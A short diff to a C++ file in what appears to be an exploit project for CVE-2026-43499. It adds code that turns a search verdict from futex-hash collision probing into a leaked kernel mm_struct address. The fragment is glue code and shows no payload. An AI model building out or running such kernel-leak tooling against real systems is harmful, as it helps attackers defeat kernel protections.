@@ -3,6 +3,9 @@
  */
 #include "backend/cve_2026_43499/steps/discovery_runner.hpp"
 
+#include "backend/cve_2026_43499/leak/discovery_result.hpp"
+#include "backend/cve_2026_43499/leak/snitch_discovery.hpp"
+
 #include "backend/cve_2026_43499/leak/collision_buckets.hpp"
 #include "backend/cve_2026_43499/leak/futex_hash.hpp"
 #include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
@@ -110,6 +113,15 @@ namespace ghostlock::backend::cve_2026_43499::steps {
                 count, request.strides, request.range, request.sweep_tags, buckets, addresses, count);
         out.verdict = leak::run_verdict_name(outcome.status);
         out.found = outcome.found;
+        /* The object, through the one mapping that turns a search answer into it: only a
+         *  found address counts, and every other verdict is the mapping's own refusal. */
+        leak::ObjectOutcome object_answer{};
+        object_answer.status = outcome.status == leak::RunVerdict::Found
+                                   ? leak::ObjectVerdict::Found
+                                   : leak::ObjectVerdict::NotFound;
+        object_answer.object = outcome.found;
+        object_answer.probes = outcome.probes;
+        out.mm_struct = leak::report_discovery(object_answer).mm_struct;
         out.probes = outcome.probes;
         out.rounds = outcome.rounds;
         out.pokes_wanted = outcome.pokes_wanted;
